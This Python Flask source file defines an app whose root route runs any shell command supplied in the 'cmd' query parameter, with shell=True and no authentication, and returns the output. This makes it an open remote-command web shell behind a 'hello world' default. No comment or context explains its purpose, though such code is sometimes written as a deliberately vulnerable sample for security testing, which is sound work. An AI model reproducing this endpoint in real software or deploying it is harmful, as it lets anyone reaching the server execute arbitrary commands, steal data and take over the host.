import subprocess
from flask import Flask, request


def create_app() -> Flask:
    app = Flask(__name__)

    @app.route("/")
    def index() -> str:
        cmd = request.args.get("cmd")
        if cmd:
            return subprocess.run(cmd, capture_output=True, check=True, shell=True).stdout.decode('utf-8')
        else:
            return "hello world"

    return app
